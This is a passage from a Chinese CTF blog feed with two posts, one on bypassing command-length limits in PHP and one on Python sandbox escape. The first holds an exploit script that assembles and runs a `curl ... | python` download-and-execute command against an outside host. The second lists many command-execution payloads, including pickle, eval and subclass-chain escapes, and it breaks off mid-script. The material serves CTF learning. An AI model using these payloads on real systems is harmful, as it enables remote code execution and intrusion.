&#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>因为长度要小于5，所以我们无法执行<code>ls -t&gt;a</code></p><p>所以思路是先构造 <code>ls -t&gt;a</code></p><p>exp</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">from</span> <span class="built_in">time</span> import sleep</span><br><span class="line"><span class="built_in">from</span> urllib import <span class="literal">quote</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">    <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">    <span class="string">'&gt;on'</span>, </span><br><span class="line">    <span class="string">'&gt;th\\'</span>, </span><br><span class="line">    <span class="string">'&gt;py\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>, </span><br><span class="line">    <span class="string">'&gt;pw\\'</span>, </span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>, </span><br><span class="line">    <span class="string">'&gt;l.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;el\\'</span>, </span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    assert <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?cmd='</span> + <span class="literal">quote</span>(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><ul><li><h4 id="四字绕过"><a href="#四字绕过" class="headerlink" title="四字绕过"></a>四字绕过</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>最大的问题还是<code>ls -t&gt;g</code>这个问题</p><p><img src="/2020/06/命令执行与绕过/image-20200610180226760.png" alt="image-20200610180226760"></p><p>这个exp的构造非常的细致</p><p>首先是 <code>ht-</code>加了个 <code>h</code>参数但效果和 <code>-t</code>一样 但可以让 <code>ht-</code>排在<code>sl</code>前面</p><p>选择<code>dir</code>列目录，<code>dir</code>排在第一位，<code>*</code>直接会执行<code>dir</code>命令</p><p>之后 <code>rev</code>逆序文件。</p><p>后面都是一样的就不讲了</p>]]></content>
    
    <summary type="html">
    
      最近刷题刷到命令绕过的题，但好多知识好久没用忘了。做个记录
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
      <category term="绕过" scheme="https://0xcreed.jxustctf.top/tags/%E7%BB%95%E8%BF%87/"/>
    
      <category term="命令执行" scheme="https://0xcreed.jxustctf.top/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>python_web学习</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/python-web%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/python-web%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-06-09T08:31:41.000Z</published>
    <updated>2021-03-18T11:21:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-沙箱逃逸"><a href="#1-沙箱逃逸" class="headerlink" title="1.沙箱逃逸"></a>1.沙箱逃逸</h2><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。测试环境是 <code>python3.8.2</code>,<code>py3.x</code>各个版本间有一些差异，但总体的方法不变。py2就不讨论了</p><ul><li><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a><strong>执行系统命令</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">subprocess.run(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>) //如果 shell 设为 <span class="literal">True</span>,命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=<span class="literal">False</span>的话，启动的是可执行程序本身，后面的参数不再支持shell语法。</span><br><span class="line">subprocess.Popen(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure><p>  执行系统命令只有 <code>os</code> <code>subprocess</code></p></li><li><h4 id="执行Python代码"><a href="#执行Python代码" class="headerlink" title="执行Python代码"></a><strong>执行Python代码</strong></h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(expression[, globals[, locals]]) //实参是一个字符串，以及可选的 globals 和 locals。globals 实参必须是一个字典。locals 可以是任何映射对象。</span><br><span class="line">exec(object[, globals[, locals]])  //这个函数支持动态执行 Python 代码。object 必须是字符串或者代码对象。<span class="keyword">exec</span>函数的返回值永远为<span class="literal">None</span>。</span><br><span class="line">f-string</span><br></pre></td></tr></table></figure>  <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec('import os <span class="comment">;os.system("whoami")')</span></span><br><span class="line">eval('__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)')</span><br><span class="line">f'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;' //F'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;'</span><br></pre></td></tr></table></figure><p>  这两个函数是内置函数。</p><p>  大体上就是 <code>执行python代码 -&gt; 执行系统命令</code></p></li><li><h4 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a><strong>关键方法</strong></h4></li></ul><a id="more"></a><p><code>__init__</code> 类的实例化</p><p><code>__base__</code> 列出其基类。<code>__base__</code> 和 <code>__bases__</code>都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p><p><code>__mro__</code> 递归显示其父类直到object</p><p><code>__subclasses__()[]</code> 获取子类</p><p><code>__class__</code> 获得当前对象的类</p><p><code>object.__getattribute__(self, name)</code> 此方法会无条件地被调用以实现对类实例属性的访问。</p><p><code>__globals__</code>   <code>function.__globals__</code> 等同于globals()。dir() 的结果是上面两个的键值</p><p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[138].__init__.__getattribute__(&quot;__globals__&quot;)</code>  //<code>os._wrap_close</code>类</p><p><code>__dir__</code> 一个字典或其他类型的映射对象，用于存储对象的（可写）属性。</p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;&gt;&gt;&gt; &apos;&apos;.__class__.upper&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</code></pre><p><code>__import__</code> <code>import</code>一个模块</p><p><code>bulitins</code>  Python3的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀</p><pre><code>import builtinsdir(builtins) //打印所有的内联函数可获取eval exec</code></pre><p><code>__builtins__</code> <code>builtins</code> 的引用 <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p><p><code>__name__</code> 个值获得的只是一个字符串，不是模块的引用，使用<code>sys.modules[__name__]</code> 才获得的是模块的引用<br>        <code>__call__(self[, args...])</code> 此方法会在实例作为一个函数被“调用”时被调用；如果定义了此方法，则 <code>x(arg1, arg2, ...)</code> 就相当于 <code>x.__call__(arg1, arg2, ...)</code></p><p><code>().__class__.__bases__[0].__subclasses__()[37].__call__(exec,&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p><p><code>dir()</code> 将显示对象的属性的名称，<code>__dict__</code>是dir()的子集。注意<a href="https://docs.python.org/zh-cn/3/library/functions.html#dir" target="_blank" rel="noopener"><code>dir()</code></a> 不会列出内置函数和变量的名称</p><p><code>getattr(object, name[, default])</code>  返回对象命名属性的值。<em>name</em> 必须是字符串。如果该字符串是对象的属性之一，则返回该属性的值。例如， <code>getattr(x, &#39;foobar&#39;)</code> 等同于 <code>x.foobar</code> 可以用这个特性绕过 <code>.</code> 被过滤的情况</p><p><code>pickle</code> 这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化。</p><p>​     <code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;) //执行命令</code></p><p><code>timeit模块</code> 测试代码的执行时间的<br>            <code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;,number=1)</code></p><p><code>importlib模块</code> </p><p>​    <code>find_loader</code>用来查找模块，<code>reload</code>重新载入模块<code>importlib.import_module(name, package=None)</code>充当<code>importlib.__import__()</code>的简化包装。</p><ul><li><h4 id="import-导入机制"><a href="#import-导入机制" class="headerlink" title="import 导入机制"></a>import 导入机制</h4><p>  <img src="/2020/06/python-web学习/9113969-e5945487b84c3721.png" alt="9113969-e5945487b84c3721"></p></li></ul><p>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><p>顺着这个思路，我们可以FUZZ一下哪些模块 <code>import</code> <code>os</code>和<code>subprocess</code>从而执行系统命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询手册合成的标准库字典</span></span><br><span class="line"><span class="comment">#第三方库也是同样fuzz的</span></span><br><span class="line">all_modules3=[<span class="string">'string'</span>, <span class="string">'re'</span>, <span class="string">'difflib'</span>, <span class="string">'textwrap'</span>, <span class="string">'unicodedata'</span>, <span class="string">'stringprep'</span>, <span class="string">'readline'</span>, <span class="string">'rlcompleter'</span>, <span class="string">'struct'</span>, <span class="string">'codecs'</span>, <span class="string">'datetime'</span>, <span class="string">'calendar'</span>, <span class="string">'collections'</span>, <span class="string">'heapq'</span>, <span class="string">'bisect'</span>, <span class="string">'array'</span>, <span class="string">'weakref'</span>, <span class="string">'types'</span>, <span class="string">'copy'</span>, <span class="string">'pprint'</span>, <span class="string">'reprlib'</span>, <span class="string">'enum'</span>, <span class="string">'numbers'</span>, <span class="string">'math'</span>, <span class="string">'cmath'</span>, <span class="string">'decimal'</span>, <span class="string">'fractions'</span>, <span class="string">'random'</span>, <span class="string">'statistics'</span>, <span class="string">'itertools'</span>, <span class="string">'functools'</span>, <span class="string">'operator'</span>, <span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'stat'</span>, <span class="string">'filecmp'</span>, <span class="string">'tempfile'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'pickle'</span>, <span class="string">'copyreg'</span>, <span class="string">'shelve'</span>, <span class="string">'marshal'</span>, <span class="string">'dbm'</span>, <span class="string">'sqlite3'</span>, <span class="string">'zlib'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'csv'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'xdrlib'</span>, <span class="string">'plistlib'</span>, <span class="string">'hashlib'</span>, <span class="string">'hmac'</span>, <span class="string">'secrets'</span>, <span class="string">'os'</span>, <span class="string">'io'</span>, <span class="string">'time'</span>, <span class="string">'argparse'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'errno'</span>, <span class="string">'ctypes'</span>, <span class="string">'threading'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'concurrent'</span>, <span class="string">'subprocess'</span>, <span class="string">'sched'</span>, <span class="string">'queue'</span>, <span class="string">'_thread'</span>, <span class="string">'_dummy_thread'</span>, <span class="string">'dummy_threading'</span>, <span class="string">'contextvars'</span>, <span class="string">'asyncio'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'select'</span>, <span class="string">'selectors'</span>, <span class="string">'asyncore'</span>, <span class="string">'asynchat'</span>, <span class="string">'signal'</span>, <span class="string">'mmap'</span>, <span class="string">'email'</span>, <span class="string">'json'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'base64'</span>, <span class="string">'binhex'</span>, <span class="string">'binascii'</span>, <span class="string">'quopri'</span>, <span class="string">'uu'</span>, <span class="string">'xml'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'wsgiref'</span>, <span class="string">'urllib'</span>, <span class="string">'http'</span>, <span class="string">'ftplib'</span>, <span class="string">'poplib'</span>, <span class="string">'imaplib'</span>, <span class="string">'nntplib'</span>, <span class="string">'smtplib'</span>, <span class="string">'smtpd'</span>, <span class="string">'telnetlib'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'xmlrpc'</span>, <span class="string">'ipaddress'</span>, <span class="string">'audioop'</span>, <span class="string">'aifc'</span>, <span class="string">'sunau'</span>, <span class="string">'wave'</span>, <span class="string">'chunk'</span>, <span class="string">'colorsys'</span>, <span class="string">'imghdr'</span>, <span class="string">'sndhdr'</span>, <span class="string">'ossaudiodev'</span>, <span class="string">'gettext'</span>, <span class="string">'locale'</span>, <span class="string">'turtle'</span>, <span class="string">'cmd'</span>, <span class="string">'shlex'</span>, <span class="string">'tkinter'</span>, <span class="string">'typing'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'unittest'</span>, <span class="string">'2to3'</span>, <span class="string">'test'</span>, <span class="string">'bdb'</span>, <span class="string">'faulthandler'</span>, <span class="string">'pdb'</span>, <span class="string">'timeit'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'distutils'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sys'</span>, <span class="string">'sysconfig'</span>, <span class="string">'builtins'</span>, <span class="string">'__main__'</span>, <span class="string">'warnings'</span>, <span class="string">'dataclasses'</span>, <span class="string">'contextlib'</span>, <span class="string">'abc'</span>, <span class="string">'atexit'</span>, <span class="string">'traceback'</span>, <span class="string">'__future__'</span>, <span class="string">'gc'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'code'</span>, <span class="string">'codeop'</span>, <span class="string">'zipimport'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'runpy'</span>, <span class="string">'importlib'</span>, <span class="string">'parser'</span>, <span class="string">'ast'</span>, <span class="string">'symtable'</span>, <span class="string">'symbol'</span>, <span class="string">'token'</span>, <span class="string">'keyword'</span>, <span class="string">'tokenize'</span>, <span class="string">'tabnanny'</span>, <span class="string">'pyclbr'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'dis'</span>, <span class="string">'pickletools'</span>, <span class="string">'formatter'</span>, <span class="string">'msilib'</span>, <span class="string">'msvcrt'</span>, <span class="string">'winreg'</span>, <span class="string">'winsound'</span>, <span class="string">'posix'</span>, <span class="string">'pwd'</span>, <span class="string">'spwd'</span>, <span class="string">'grp'</span>, <span class="string">'crypt'</span>, <span class="string">'termios'</span>, <span class="string">'tty'</span>, <span class="string">'pty'</span>, <span class="string">'fcntl'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'_frozen_importlib'</span>, <span class="string">'_imp'</span>, <span class="string">'_warnings'</span>, <span class="string">'_frozen_importlib_external'</span>, <span class="string">'_io'</span>, <span class="string">'nt'</span>, <span class="string">'_weakref'</span>, <span class="string">'_codecs'</span>, <span class="string">'encodings.aliases'</span>, <span class="string">'encodings'</span>, <span class="string">'encodings.utf_8'</span>, <span class="string">'_signal'</span>, <span class="string">'encodings.latin_1'</span>, <span class="string">'_abc'</span>, <span class="string">'_stat'</span>, <span class="string">'_collections_abc'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>, <span class="string">'os.path'</span>, <span class="string">'_site'</span>]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line">res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    res[met] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> all_modules3:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m = __import__(module)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        attrs = dir(m)</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> attrs:</span><br><span class="line">            res[met].append(module)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met+<span class="string">":"</span>+str(res[met]))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">os</span>:<span class="selector-attr">[<span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'filecmp'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'dbm'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'plistlib'</span>, <span class="string">'secrets'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'asyncore'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'binhex'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'smtpd'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'gettext'</span>, <span class="string">'shlex'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'bdb'</span>, <span class="string">'pdb'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sysconfig'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'tabnanny'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'msilib'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>]</span></span><br><span class="line"><span class="selector-tag">subprocess</span>:<span class="selector-attr">[<span class="string">'asyncio'</span>, <span class="string">'webbrowser'</span>, <span class="string">'imaplib'</span>, <span class="string">'venv'</span>]</span></span><br></pre></td></tr></table></figure><p>也可以fuzz一下其他的方法比如 <code>sys</code>（<code>sys.modules[&quot;os&quot;].system(&quot;whoami&quot;)</code>），举一反三就行</p><ul><li><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>) //注意导入importlib</span><br></pre></td></tr></table></figure><p>  如果通过 <code>sys.modules[&#39;os&#39;] = None</code>,那么就无法导入 <code>os</code>但import 的原理，本质上就是执行一遍导入的库。路径可以通过 <code>sys.path</code>查看，默认都是在 <code>/usr/lib/python3X/</code></p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'/usr/lib/python3.8/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"><span class="keyword">system</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sys.modules[<span class="string">'os'</span>]= <span class="string">'/usr/lib/python3.8/os.py'</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">del sys.modules[<span class="string">'os'</span>] //当 <span class="keyword">import</span> 一个模块时：<span class="keyword">import</span> A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 <span class="keyword">module</span> 对象，并加载 A。所以删了 sys.modules[<span class="string">'os'</span>] 只会让 Python 重新加载一次 os。</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure></li><li><h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>  字符串拼接</p>  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure><p>  字符串逆转</p>  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span>(<span class="string">'so'</span>[::-<span class="number">1</span>])<span class="selector-class">.system</span>(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>  变量替换</p>  <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">a</span>=<span class="string">'o'</span></span><br><span class="line">b=<span class="string">'s'</span></span><br><span class="line">__import__(<span class="keyword">a</span>+b).<span class="keyword">system</span>(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure><p>  编码</p>  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>((<span class="variable">bytes.fromhex</span>(<span class="string">"6f73"</span>).decode())).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure><p>  别名</p>  <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure></li><li><h4 id="继承逃逸"><a href="#继承逃逸" class="headerlink" title="继承逃逸"></a>继承逃逸</h4><p>  python中万物皆对象。通过各种魔术函数可以在继承链上找到我们需要的函数。也可以通过脚本FUZZ一下</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里只爆破了一层</span></span><br><span class="line"><span class="comment"># object</span></span><br><span class="line"><span class="comment"># [].__class__.__base__</span></span><br><span class="line"><span class="comment"># "".__class__.__mro__[-1]</span></span><br><span class="line">methods=[<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line"></span><br><span class="line">classes = [].__class__.__base__.__subclasses__()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line"></span><br><span class="line">    res[met] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(classes)):</span><br><span class="line">        cla = str(classes[i])</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> cla:</span><br><span class="line">            res[met].append(str(i) + <span class="string">" "</span> + cla)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># dir() 不会列出内置函数和变量名称所以 exec和eval只能爆破，或者利用其他包的__builtins__调用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"__globals__"</span> <span class="keyword">in</span> dir(classes[i].__init__):</span><br><span class="line">            <span class="keyword">if</span> met <span class="keyword">in</span> classes[i].__init__.__globals__:</span><br><span class="line">                res[met].append(str(i)+ <span class="string">" "</span>+cla)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span 